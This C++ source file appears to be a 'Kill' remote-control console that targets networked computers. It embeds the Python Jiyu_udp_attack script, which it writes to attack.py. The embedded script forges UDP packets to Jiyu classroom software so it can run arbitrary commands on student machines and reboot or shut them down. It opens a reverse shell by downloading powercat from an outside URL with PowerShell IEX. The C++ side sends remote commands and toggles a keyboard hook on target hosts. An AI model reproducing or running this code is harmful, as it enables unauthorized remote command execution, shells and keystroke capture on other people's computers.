    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]]",
    "",
    "basicCMD = {",
    "    \'-msg\': store[0],",
    "    \'-c\': store[1],",
    "    \'-r\': store[2],",
    "    \'-s\': store[3],",
    "}",
    "",
    "header = \"\"\"",
    "",
    "    ------------------- Github Repositories -------------------",
    "                        详细说明请看项目文档",
    "            https://github.com/ht0Ruial/Jiyu_udp_attack",
    "",
    "\"\"\"",
    "parser = argparse.ArgumentParser(header)",
    "parser.add_argument(\'-ip\', type=str, help=\"ip 指定目标IP地址\")",
    "parser.add_argument(\'-p\', type=int, default=4705, help=\"port 指定监听端口，默认端口为4705\")",
    "parser.add_argument(",
    "    \'-msg\', type=str, help=\"send_message发送消息 eg: -msg  \\\"HelloWord!\\\"\")",
    "parser.add_argument(",
    "    \'-c\', type=str, help=\"command命令 eg: -c   \\\"cmd.exe /c ipconfig\\\"\")",
    "parser.add_argument(\'-l\', type=int, default=1, help=\"循环次数，默认为1\")",
    "parser.add_argument(\'-t\', type=int, default=22, help=\"循环时间间隔，默认是22秒\")",
    "",
    "parser.add_argument(\'-e\', type=str, choices=[\'r\', \'s\', \'g\', \'nc\', \'break\', \'continue\'], "
    "help=\"Extra Options加载额外的选项 eg：-e r\"",
    "                    )",
    "subparsers = parser.add_subparsers(help=\'-e 参数的详细说明\')",
    "subparsers.add_parser(\'r\', help=\'reboot 重启\')",
    "subparsers.add_parser(\'s\', help=\'shutdown 关机\')",
    "subparsers.add_parser(\'g\', help=\'独立选项，获取当前的ip地址以及学生端监听的端口\')",
    "subparsers.add_parser(\'nc\', help=\'独立选项，反弹shell的机器需出网，退出可使用命令exit\')",
    "subparsers.add_parser(\'break\', help=\'独立选项，脱离屏幕控制，需要管理员权限\')",
    "subparsers.add_parser(\'continue\', help=\'独立选项，恢复屏幕控制\')",
    "args = parser.parse_args()",
    "",
    "",
    "# 格式化要发送的消息",
    "def format_b4_send(content):",
    "    arr = []",
    "    for ch in content:",
    "        tmp = \'\'.join(list(map(lambda x: hex(ord(x)), ch)))",
    "        if int(tmp, 16) > 0xff:",
    "            tmp = tmp[2:]",
    "            high = int((tmp[0] + tmp[1]), 16)",
    "            low = int((tmp[2] + tmp[3]), 16)",
    "            arr.append(low)",
    "            arr.append(high)",
    "        else:",
    "            high = 0",
    "            low = int((tmp[2] + tmp[3]), 16)",
    "            arr.append(low)",
    "            arr.append(high)",
    "    return arr",
    "",
    "",
    "# 获取ip",
    "def get_ip(ip):",
    "    target_host = []",
    "    if ip.find(\'.\') == -1:",
    "        sys.exit(0)",
    "    if ip.find(\'-\') != -1:",
    "        ip_arr = ip.split(\'-\')",
    "        ip_arrs = ip_arr[0].split(\'.\')",
    "        if int(ip_arr[1]) > 254:",
    "            ip_arr[1] = \'254\'",
    "        for i in range(int(ip_arrs[3]), int(ip_arr[1])+1):",
    "            ip_arrs[3] = str(i)",
    "            target_host.append(\'.\'.join(ip_arrs))",
    "    elif ip.find(\'/\') == -1:",
    "        target_host.append(ip)",
    "    elif ip.find(\'/24\') != -1:",
    "        ip_arr = ip.split(\'/\')",
    "        ip_arrs = ip_arr[0].split(\'.\')",
    "        for i in range(1, 255):",
    "            ip_arrs[3] = str(i)",
    "            target_host.append(\'.\'.join(ip_arrs))",
    "    else:",
    "        sys.exit(0)",
    "    return target_host",
    "",
    "",
    "# 将要发送的消息打包成完整的指令",
    "def pkg_sendlist(cmdtype, content):",
    "    arrs = format_b4_send(content)",
    "    if cmdtype == \'-msg\':",
    "        index = 56",
    "        result = basicCMD[\'-msg\']",
    "        for elem in arrs:",
    "            result[index] = elem",
    "            index += 1",
    "    elif cmdtype == \'-c\':",
    "        index = 578",
    "        result = basicCMD[\'-c\']",
    "        for elem in arrs:",
    "            result[index] = elem",
    "            index += 1",
    "    return result",
    "",
    "",
    "# 发送",
    "def send(send_list):",
    "    if len(send_list) == 0:",
    "        sys.exit(0)",
    "    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)",
    "    target_host = get_ip(args.ip)",
    "    for times in range(args.l):",
    "        for i in target_host:",
    "            for abc in send_list:",
    "                payload = pack(\"%dB\" % (len(abc)), *abc)",
    "                client.sendto(payload, (i, args.p))",
    "        if args.l == 1:",
    "            sys.exit(0)",
    "        if times != args.l - 1:",
    "            sleep(args.t)",
    "",
    "",
    "def creat_send_object():",
    "    send_list = []",
    "",
    "    # 获取命令内容",
    "    if args.msg:",
    "        send_list.append(pkg_sendlist(\'-msg\', args.msg))",
    "",
    "    if args.c:",
    "        send_list.append(pkg_sendlist(\'-c\', args.c))",
    "",
    "    if args.e == \'r\':",
    "        send_list.append(basicCMD[\'-r\'])",
    "",
    "    if args.e == \'s\':",
    "        send_list.append(basicCMD[\'-s\'])",
    "",
    "    return send_list",
    "",
    "",
    "def single_command():",
    "    if args.e == \'g\':",
    "        try:",
    "            hostname = socket.gethostname()",
    "            ip = socket.gethostbyname(hostname)",
    "",
    "            tasklist = popen(\"tasklist|find \\\"Student\\\"\").read()",
    "            pattern = compile(r\'[e]\\s*\\d{1,5}\\s*[C]\')",
    "            pid = (pattern.search(tasklist).group()[1:-1]).strip()",
    "",
    "            netstat = popen(\"netstat -ano |find \\\"{}\\\"\".format(pid)).read()",
    "            pattern = compile(r\"%s:\\d{1,5}\\s*[*]{1}\" % ip)",
    "            netstat_pat = pattern.findall(netstat)",
    "",
    "            ports = [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]",
    "        except:",
    "            pass",
    "        sys.exit(0)",
    "",
    "    elif args.e == \'break\':",
    "        popen(\'sc config MpsSvc start= auto\')",
    "        popen(\'net start MpsSvc\')",
    "        popen(\'netsh advfirewall set allprofiles state on\')",
    "        popen(\'netsh advfirewall firewall set rule name=\"StudentMain.exe\" new action=block\')",
    "        sleep(1)",
    "        system(\"cls\")",
    "        sys.exit(0)",
    "",
    "    elif args.e == \'continue\':",
    "        popen(\'netsh advfirewall firewall set rule name=\"StudentMain.exe\" new action=allow\')",
    "        sys.exit(0)",
    "",
    "",
    "def netcat(num):",
    "    send_list = []",
    "    hostname = socket.gethostname()",
    "    ip = socket.gethostbyname(hostname)",
    "    cmd = \"powershell IEX (New-Object System.Net.Webclient).DownloadString(\'https://xss.pt/hYvg\');powercat -c "
    "{} -p {} -e cmd\".format(ip, num)",
    "    send_list.append(pkg_sendlist(\'-c\', cmd))",
    "    send(send_list)",
    "",
    "",
    "def run_from_cmd():",
    "    try:",
    "        single_command()",
    "        if args.e != \'nc\':",
    "            send_list = creat_send_object()",
    "            send(send_list)",
    "            sys.exit(0)",
    "        num = random.randint(1, 65535)",
    "        pool = Pool(processes=1)",
    "        pool.apply_async(netcat, (num,))",
    "        system(\"powershell IEX (New-Object "
    "System.Net.Webclient).DownloadString(\'https://xss.pt/hYvg\');powercat -l -p {}\".format(num))",
    "        pool.close()",
    "        pool.join()",
    "    except Exception as e:",
    "        print(\"\")",
    "",
    "",
    "if __name__ == \'__main__\':",
    "    run_from_cmd()"};

const int MaxIP = 1e2 + 5;
const int MaxName = 1e2 + 5;
const int MaxCommand = 1e3 + 5;
const int MaxComputer = 1e2 + 5;

class computer
{
  public:
    bool online;
    char ip[MaxIP];
    char name[MaxName];
};

int computer_num;
char my_ip[MaxIP];
char command[MaxCommand];
computer computer_list[MaxComputer];
std::mutex Mutex;

/**
 *@初始化
 */
void init()
{
    system("chcp 65001");
    SetConsoleTitle("Kill v1.0.0");
    system("cls");
}

/**
 *@检测在列表中的每一台计算机是不是在线
 */
void liveTest()
{
    for (int i = 1; i <= computer_num; i++)
    {
        std::lock_guard<std::mutex> lock(Mutex);
        net::Send(computer_list[i].ip, 8800, "check");
        char *res = net::ListenNoWait(9902);
        if (res != nullptr && strcmp(res, "online") == 0)
        {
            computer_list[i].online = true;
        }
        else
        {
            computer_list[i].online = false;
        }
    }
}

/**
 *@后台服务进程
 */
void background()
{
    for (;;)
    {
        liveTest();
        _sleep(200);
    }
}

/**
 *@根据IP寻找计算机
 */
int findComputerIP(const char want_computer[])
{
    for (int i = 1; i <= computer_num; i++)
    {
        if (strcmp(computer_list[i].ip, want_computer) == 0)
        {
            return i;
        }
    }
    return -1;
}

/**
 *@根据名字寻找计算机
 */
int findComputerName(const char want_computer[])
{
    for (int i = 1; i <= computer_num; i++)
    {
        if (strcmp(computer_list[i].name, want_computer) == 0)
        {
            return i;
        }
    }
    return -1;
}

/**
 *@输出Python文件，用于Jiyu
 */
void make_python()
{
    FILE *f;
    f = fopen("attack.py", "w");
    for (int i = 0; i < 215; i++)
    {
        fprintf(f, "%s\n", python[i]);
    }
    fclose(f);
}

/**
 *@处理add命令，添加计算机
 */
void commandAdd(int last)
{
    int len = strlen(command);
    char ip[MaxCommand];
    getCommandWord(ip, last, command);
    if (!checkIP(ip))
    {
        printf("[ERROR]: IP is illegal\n");
    }
    else
    {
        char msg[MaxCommand];
        sprintf(msg, "connect %s", my_ip);
        if (net::Send(ip, 8801, msg))
        {
            char *name = net::ListenNoWait(9901);
            debug("%s\n", name);
            if (strlen(name) != 0)
            {
                std::lock_guard<std::mutex> lock(Mutex);
                computer_num++;
                strcpy(computer_list[computer_num].ip, ip);
                strcpy(computer_list[computer_num].name, name);
                computer_list[computer_num].online = true;
            }
        }
    }
}

/**
 *@设置自己的IP，为握手做准备
 */
void commandMe(int last)
{
    char tmp_ip[MaxIP];
    getCommandWord(tmp_ip, last, command);
    if (!checkIP(tmp_ip))
    {
        printf("[ERROR]: IP is illegal\n");
    }
    else
    {
        strcpy(my_ip, tmp_ip);
    }
}

/**
 *@处理kill命令，让指定计算机执行命令
 */
void commandKill(int last)
{
    char kill_ip[MaxIP];
    char kill_command[MaxCommand];
    int next = getCommandWord(kill_ip, last, command);
    getCommandWord(kill_command, next, command, "\"");
    if (kill_command[0] == '\"')
    {
        strcpy(kill_command, strtok(kill_command + 1, "\""));
    }
    if (findChar(kill_ip, '.') == 3)
    {
        int kill_to = findComputerIP(kill_ip);
        if (kill_to == -1)
        {
            printf("[WARING]: The IP is not in the database\n");
        }
        char tmp_command[MaxCommand];
        sprintf(tmp_command, "c,%s", kill_command);
        net::Send(kill_ip, 8800, tmp_command);
    }
    else
    {
        int kill_to = findComputerName(kill_ip);
        if (kill_to == -1)
        {
            printf("[ERROR]: Computer not found\n");
        }
        else
        {
            char tmp_command[MaxCommand];
            sprintf(tmp_command, "c,%s", kill_command);
            net::Send(computer_list[kill_to].ip, 8800, tmp_command);
        }
    }
    std::lock_guard<std::mutex> lock(Mutex);
}

/**
 *@处理命令ls，显示所有计算机
 */
void commandLs(int last)
{
    for (int i = 1; i <= computer_num; i++)
    {
        printf("%-20s %-20s %s\n", computer_list[i].name, computer_list[i].ip,
               computer_list[i].online ? "online" : "not online");
    }
}

/**
 *@处理命令key，开启或关闭键盘钩子
 */
void commandKey(int last)
{
    char key_ip[MaxIP];
    char key_mode[MaxCommand];
    int next = getCommandWord(key_ip, last, command);
    getCommandWord(key_mode, next, command);
    if (findChar(key_ip, '.') == 3)
    {
        int kill_to = findComputerIP(key_ip);
        if (kill_to == -1)
        {
            printf("[WARING]: The IP is not in the database\n");
        }
        char tmp_command[MaxCommand];
        sprintf(tmp_command, "k%c", strcmp(key_mode, "true") == 0 ? 't' : 'f');
        net::Send(key_ip, 8800, tmp_command);
        system("start KeyListen.exe");
    }
    else
    {
        int kill_to = findComputerName(key_ip);
        if (kill_to == -1)
        {
            printf("[ERROR]: Computer not found\n");
        }
        else
        {
            char tmp_command[MaxCommand];
            sprintf(tmp_command, "k%c", strcmp(key_mode, "true") == 0 ? 't' : 'f');
            net::Send(computer_list[kill_to].ip, 8800, tmp_command);
            system("start KeyListen.exe");
        }
    }
    std::lock_guard<std::mutex> lock(Mutex);
}

/**
 *@处理命令jiyu，利用极域进行kill
 */
void commandJiyu(int last)
{
    char jiyu_ip[MaxIP];
    char jiyu_mode[MaxCommand];
    int next = getCommandWord(jiyu_mode, last, command);
    next = getCommandWord(jiyu_ip, next, command);
    make_python();
    debug("%s\n", jiyu_mode);
    if (strcmp(jiyu_mode, "add") == 0)
    {
    }
    else if (strcmp(jiyu_mode, "kill") == 0)
    {
        char jiyu_command[MaxCommand];
        getCommandWord(jiyu_command, next, command, "\"");
        if (jiyu_command[0] == '\"')
        {
            strcpy(jiyu_command, strtok(jiyu_command + 1, "\""));
        }
        debug("%s %s %s\n", jiyu_mode, jiyu_command, jiyu_ip);
        if (findChar(jiyu_ip, '.') == 3)
        {
            int kill_to = findComputerIP(jiyu_ip);
            if (kill_to == -1)
            {
                printf("[WARING]: The IP is not in the database\n");
            }
            char tmp_command[MaxCommand];
            sprintf(tmp_command, "python attack.py -ip %s -c \"%s\"", jiyu_ip, jiyu_command);
            debug("%s\n", tmp_command);
            system(tmp_command);
        }
        else
        {
            int jiyu_to = findComputerName(jiyu_ip);
            if (jiyu_to == -1)
            {
                printf("[ERROR]: Computer not found\n");
            }
            else
            {
                char tmp_command[MaxCommand];
                sprintf(tmp_command, "python attack.py -ip %s -c \"%s\"", jiyu_ip, computer_list[jiyu_to].ip);
                debug("%s\n", tmp_command);
                system(tmp_command);
            }
        }
    }
    std::lock_guard<std::mutex> lock(Mutex);
}

/**
 *@命令解析
 */
void commandAnalysis()
{
    int len = strlen(command);
    char main_command[MaxCommand];
    int next = getCommandWord(main_command, 0, command);
    if (strcmp(main_command, "add") == 0)
    {
        commandAdd(next);
    }
    else if (strcmp(main_command, "me") == 0)
    {
        commandMe(next);
    }
    else if (strcmp(main_command, "kill") == 0)
    {
        commandKill(next);
    }
    else if (strcmp(main_command, "ls") == 0)
    {
        commandLs(next);
    }
    else if (strcmp(main_command, "key") == 0)
    {
        commandKey(next);
    }
    else if (strcmp(main_command, "jiyu") == 0)
    {
        commandJiyu(next);
    }
    else
    {
        printf("[ERROR]: Unkown command\n");
    }
}

int main(int argv, char *argc[])
{
    init();
    std::thread thread_server(background);
    for (;;)
    {
        printf("Kill>>> ");
        std::cin.getline(command, MaxCommand);
        commandAnalysis();
    }
    return 0;
}